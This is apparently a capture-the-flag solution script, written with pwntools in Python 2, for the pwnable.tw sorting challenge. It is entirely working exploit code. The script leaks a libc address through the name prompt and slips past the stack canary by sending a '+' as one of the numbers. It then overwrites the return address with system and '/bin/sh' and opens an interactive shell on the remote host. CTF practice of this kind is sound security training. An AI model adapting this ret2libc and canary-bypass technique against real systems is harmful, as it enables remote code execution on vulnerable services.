from pwn import *

p = remote("chall.pwnable.tw",10101)
elf = ELF("./libc_32.so.6")
p.sendlineafter("name :","a"*24)

leak = p.recvuntil(",How")
libc_base = u32(leak.split("\x01")[0][-4:]) - 0x1ae244
system = libc_base + elf.sym['system']
binsh = libc_base + next(elf.search('/bin/sh'))

#print hex(u32(leak.split("\x01")[1][]))
print "[+] libc_base : " + hex(libc_base)
print "[+] system : " + hex(system)
print "[+] binsh : " + hex(binsh)

#esp 0xffa60120
#canary = esp + 0x7c
#ret = 0xffa601bc
#start write = 0xffa6013c

#plant : write ... canary  ebp ret 
#		1 1 ... 1.. + 	system  system binsh 
#24 times '1' , 1 times '+', 9 times system, 2 times binsh

p.sendlineafter("sort :","35")
for i in range(0,24):
	p.sendlineafter("number :","1")
p.sendlineafter("number :","+")
for i in range(0,9):
	p.sendlineafter("number :",str(system))
p.sendlineafter("number :",str(binsh))


p.interactive()